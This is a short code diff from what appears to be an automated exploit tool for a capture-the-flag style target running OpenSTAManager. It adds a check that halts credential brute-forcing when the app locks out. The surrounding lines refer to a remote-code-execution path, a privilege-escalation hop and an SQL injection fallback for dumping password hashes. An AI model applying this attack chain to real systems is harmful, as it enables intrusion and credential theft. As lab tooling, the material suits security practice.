@@ -241,6 +241,13 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
         #    command channel; use it for the user flag and the OliveTin root hop.
         if _p7m_rce(host, base, vhost, user, pw, login):
             return True
+        # Stop after the top credential once the app is brute-locked — hammering
+        # the rest only deepens the lockout (the real portal cred sorts first, so
+        # it already got its clean attempt).
+        if _is_brute_locked(_get(base + "/index.php", vhost)):
+            utils.log("warn", "OpenSTAManager brute-locked — stopping this pass "
+                              "(retries when it clears / creds change)", indent=1)
+            return False
         # 2) fallback: authenticated SQLi (CVE-2026-24418) to dump users/hashes,
         #    and try to turn it into exec via OUTFILE for the same privesc chain.
         cookiefile = _login(base, vhost, user, pw)
